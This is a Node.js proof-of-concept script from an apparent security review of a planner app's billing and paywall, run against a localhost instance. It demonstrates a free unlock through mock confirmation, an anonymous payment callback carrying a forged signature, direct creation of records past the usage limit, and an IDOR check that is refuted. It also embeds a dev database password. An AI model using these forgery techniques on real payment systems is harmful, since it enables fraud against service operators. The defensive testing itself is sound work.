// TAB-02 billing / paywall adversarial PoC (LIVE against http://localhost:5080).
// Covers: §8 mock-confirm free unlock, unsigned [AllowAnonymous] callback forgery,
// §8 lower-level create bypass, confirm foreign orderRef (IDOR), checkout row growth,
// alreadyUnlocked idempotency, §6 401 without token, 402 on consume limit.
//
// Run: node adversarial-review/poc/02-quick-add/billing_bypass.mjs
import { execFileSync } from 'node:child_process'
import { provision, api } from '../_lib/provision.mjs'

const ok = (c) => (c ? 'CONFIRMED' : 'refuted')
const db = (sql) => execFileSync('docker', ['exec', 'planner-mysql', 'mysql', '-N', '-uplanner',
  '-pplanner_dev_password', 'planner', '-e', sql], { encoding: 'utf8' }).trim()

const tag = Math.random().toString(36).slice(2, 7)
console.log('=== TAB-02 billing bypass PoC ===\n')

// ---------------------------------------------------------------------------
// §6: status / consume without token → 401
{
  const s = await api('GET', '/api/quick-add/status', {})
  const c = await api('POST', '/api/quick-add/consume', {})
  console.log(`[§6 auth] status no-token=${s.status} consume no-token=${c.status}  => ${ok(s.status === 401 && c.status === 401)} (expected 401/401)`)
}

// ---------------------------------------------------------------------------
// §8 / §10: default Mock=true → confirm any OWN pending order unlocks for FREE.
{
  const u = await provision({ email: `adv.t02.mock.${tag}@gmail.com`, gender: 'female' })
  const st0 = await api('GET', '/api/quick-add/status', { token: u.token })
  const co = await api('POST', '/api/billing/checkout', { token: u.token })
  const orderRef = co.json?.orderReference
  const conf = await api('POST', '/api/billing/confirm', { token: u.token, body: { orderReference: orderRef } })
  const st1 = await api('GET', '/api/quick-add/status', { token: u.token })
  const pay = db(`SELECT Status FROM Payments WHERE OrderReference='${orderRef}';`)
  console.log(`\n[§8 mock-confirm] mock=${co.json?.mock} orderRef=${orderRef}`)
  console.log(`   before unlocked=${st0.json?.unlocked}  confirm.paid=${conf.json?.paid}  after unlocked=${st1.json?.unlocked}  payment.Status=${pay}`)
  console.log(`   => ${ok(co.json?.mock === true && conf.json?.paid === true && st1.json?.unlocked === true)} full access granted with ZERO real payment (card never validated)`)
}

// ---------------------------------------------------------------------------
// §8: unsigned [AllowAnonymous] callback forgery → unlock WITHOUT any token on the
// callback and WITHOUT a valid merchantSignature. Attacker auths only to mint an
// orderRef (checkout); the unlock POST carries no auth and no signature.
{
  const v = await provision({ email: `adv.t02.cb.${tag}@gmail.com`, gender: 'male' })
  const co = await api('POST', '/api/billing/checkout', { token: v.token })
  const orderRef = co.json?.orderReference
  // Anonymous callback, NO Authorization header, NO merchantSignature field:
  const cb = await api('POST', '/api/billing/callback', {
    body: { orderReference: orderRef, transactionStatus: 'Approved', merchantSignature: 'totally-forged' },
  })
  const st = await api('GET', '/api/quick-add/status', { token: v.token })
  const pay = db(`SELECT Status FROM Payments WHERE OrderReference='${orderRef}';`)
  console.log(`\n[§8 callback forgery] callback status=${cb.status} (anonymous, forged signature)`)
  console.log(`   ack=${cb.text?.slice(0, 80)}`)
  console.log(`   after unlocked=${st.json?.unlocked}  payment.Status=${pay}`)
  console.log(`   => ${ok(st.json?.unlocked === true)} server never verifies inbound merchantSignature (BillingService.cs:117-139)`)
}

// ---------------------------------------------------------------------------
// §8/§6: confirm with a FOREIGN orderReference → scoped by UserId → paid:false
// (no 403/404 leak => good against enumeration).
{
  const a = await provision({ email: `adv.t02.a.${tag}@gmail.com`, gender: 'female' })
  const b = await provision({ email: `adv.t02.b.${tag}@gmail.com`, gender: 'male' })
  const coA = await api('POST', '/api/billing/checkout', { token: a.token })
  const refA = coA.json?.orderReference
  const asB = await api('POST', '/api/billing/confirm', { token: b.token, body: { orderReference: refA } })
  const stB = await api('GET', '/api/quick-add/status', { token: b.token })
  console.log(`\n[§7 confirm IDOR] B confirms A's orderRef => http=${asB.status} paid=${asB.json?.paid} B.unlocked=${stB.json?.unlocked}`)
  console.log(`   => ${ok(asB.json?.paid === false && stB.json?.unlocked === false)} foreign order cannot unlock via confirm (scoped to UserId) — IDOR-via-confirm REFUTED`)
}

// ---------------------------------------------------------------------------
// §8/§10: lower-level create bypass. Exhaust the free limit, then create entities
// DIRECTLY via the generic module endpoints (no entitlement check there).
{
  const u = await provision({ email: `adv.t02.low.${tag}@gmail.com`, gender: 'female' })
  let last
  for (let i = 0; i < 5; i++) last = await api('POST', '/api/quick-add/consume', { token: u.token })
  const task = await api('POST', '/api/tasks', { token: u.token, body: { title: 'bypass-task', moduleCode: 'tasks' } })
  const note = await api('POST', '/api/notes', { token: u.token, body: { text: 'bypass-note', color: '#fff3b0' } })
  const fin = await api('POST', '/api/finance/transactions', { token: u.token, body: { amount: 50, type: 'Expense', description: 'bypass' } })
  console.log(`\n[§8 lower-level bypass] consume now=${last.status} (402 => limit exhausted)`)
  console.log(`   direct create: task=${task.status} note=${note.status} finance=${fin.status}`)
  console.log(`   => ${ok(last.status === 402 && task.status === 200 && note.status === 200 && fin.status === 200)} paywall only guards the NLP convenience, not entity creation`)
}

// ---------------------------------------------------------------------------
// §6/§8: checkout spawns a NEW Pending Payment on every click → unbounded growth.
{
  const u = await provision({ email: `adv.t02.grow.${tag}@gmail.com`, gender: 'male' })
  for (let i = 0; i < 6; i++) await api('POST', '/api/billing/checkout', { token: u.token })
  const n = db(`SELECT COUNT(*) FROM Payments WHERE UserId=${u.userId} AND Status='Pending';`)
  console.log(`\n[§6 checkout growth] 6 checkouts => ${n} Pending rows for one user`)
  console.log(`   => ${ok(Number(n) >= 6)} every checkout inserts a new Pending Payment; no dedup / no expiry cleanup`)
}

// ---------------------------------------------------------------------------
// §10: alreadyUnlocked — repeat checkout after unlock returns {alreadyUnlocked:true}, no new row.
{
  const u = await provision({ email: `adv.t02.already.${tag}@gmail.com`, gender: 'female' })
  const co = await api('POST', '/api/billing/checkout', { token: u.token })
  await api('POST', '/api/billing/confirm', { token: u.token, body: { orderReference: co.json?.orderReference } })
  const before = db(`SELECT COUNT(*) FROM Payments WHERE UserId=${u.userId};`)
  const co2 = await api('POST', '/api/billing/checkout', { token: u.token })
  const after = db(`SELECT COUNT(*) FROM Payments WHERE UserId=${u.userId};`)
  console.log(`\n[§10 alreadyUnlocked] repeat checkout => ${JSON.stringify(co2.json)}  rows ${before}->${after}`)
  console.log(`   => ${ok(co2.json?.alreadyUnlocked === true && before === after)} no new Payment after unlock (expected)`)
}

console.log('\n=== done ===')
